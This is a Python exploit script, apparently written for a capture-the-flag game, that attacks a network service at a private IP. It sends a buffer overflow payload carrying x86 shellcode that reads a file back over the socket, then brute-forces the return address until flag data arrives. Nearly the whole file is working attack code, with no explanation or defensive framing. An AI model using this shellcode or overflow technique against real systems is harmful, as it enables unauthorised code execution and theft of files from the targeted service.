import struct
import socket
import sys
import time
import binascii
import os

genes = 'ACGT'

def genpat(plen):
   pat = ''
   for i in range(plen):
      n = ord(os.urandom(1)) & 3
      pat += genes[n]
   return pat

readfile = "\xeb\x0c\x55\xff\xe0\x41\x41\x41\x41\x41\x41\x41\x41\x41\x58\x5e"
readfile += "\x31\xc0\x50\x50\xb0\x03\x50\xb8\xd0\xde\xf7\x07\xff\xd0\x89\xe0"
readfile += "\x6a\x01\x50\x6a\x03\xb8\x01\xde\xf7\x07\xe8\xd3\xff\xff\xff\x85"
readfile += "\xc0\x7e\x0e\x58\x56\xb8\xf0\xdb\xf7\x07\xff\xd0\x83\xc4\x0c\xeb"
readfile += "\xdd\xb8\x90\xc1\xf7\x07\xff\xe0"
# total size: 72 bytes

eip = 0x804E740

s = socket.socket()
s.connect(('10.60.123.4', 1013))

patlen = 102 - 72 - 1

s.settimeout(0.2)

while True:

   pat = genpat(patlen)

   sys.stderr.write("using eip: 0x%x\n" % eip)
      
   payload = pat + " " + readfile + "HHHHHHHHHHHH" + "\xf8\xff\xff\xff" + "\x8c\xe1\x04\x08" + struct.pack("<I", eip + patlen + 1) + "\n"
   
   s.send(payload)
   while True:
      ch = s.recv(1)
      sys.stderr.write(ch)
      if ch == "\n":
         break
   
   sys.stderr.write("sending pat\n");
   s.send(pat + "\n")
   while True:
      ch = s.recv(1)
      sys.stderr.write(ch)
      if ch == "\n":
         break
   sys.stderr.write("last recv\n");

   flags = s.recv(4096)

   if flags:
      sys.stderr.write("eip: 0x%x\n" % eip)
      while flags:
         sys.stdout.write(flags)
         flags = s.recv(4096)
      sys.exit(0)
   
   eip += 8
